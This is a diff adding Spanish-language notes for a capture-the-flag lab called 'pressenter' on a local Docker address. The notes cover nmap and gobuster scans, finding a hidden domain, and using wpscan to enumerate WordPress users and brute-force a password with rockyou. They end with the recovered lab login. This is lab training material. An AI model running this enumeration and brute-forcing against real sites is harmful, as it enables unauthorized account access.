@@ -1,0 +1,51 @@
+Copiar el archivo y pegarlo en Kali 
+extraer los archivos 
+
+cd /home/kali/Desktop
+ls
+cd pressenter
+ls
+ 
+chmod +x auto_deploy.sh
+
+sudo wget https://archive.kali.org/archive-keyring.gpg -O /usr/share/keyrings/kali-archive-keyring.gpg
+apt update 
+
+./auto_deploy.sh showtime.tar // bash auto_deploy.sh pressenter.tar
+
+nmap -sVC -p- -n --min-rate 5000 172.17.0.2
+
+nmap -p- -sS -n 172.17.0.2 // nmap -sC -sV -Pn 172.17.0.2 -oG General
+
+nmap -sCV -p80 -v 172.17.0.2
+
+gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,txt,xml
+
+buscar la direccion IP en un navegador
+INSPECCIONAR EL CODIGO DE LA PAGINA DESDE EL NAVEGADOR, VERIFICAR DOMINIOS OCULTOS EN ESTE CASO 
+<p class="hidden-domain">Find us at <a href="http://pressenter.hl" target="_blank">pressenter.hl</a></p>
+
+Si intentan ingresar no funcionara porque tienen que agregar el host.
+
+nano /etc/hosts 
+172.17.0.2         pressenter.hl
+
+whatweb pressenter.hl
+wpscan --url http://pressenter.hl/ --enumerate u,vp -> Solo se puede usar porque es un Wordpress
+
+gobuster dir -u http://pressenter.hl -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,txt,xml
+gobuster dir -u http://pressenter.hl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,py,doc,html -t 100
+gobuster dir -u http://pressenter.hl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+Probamos ingresando a wp-admin 
+
+wpscan --url http://pressenter.hl --usernames pressi --passwords /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+wpscan --password-attack xmlrpc -t 20 -U pressi -P /usr/share/wordlists/rockyou.txt --url http://pressenter.hl
+
+cp /usr/share/wordlists/rockyou.txt.gz . -> descomprimirlo
+wpscan --url http://pressenter.hl -U pressi -P /home/kali/Desktop/pressenter/rockyou.txt
+
+user pressi pass dumbass
+
+
+
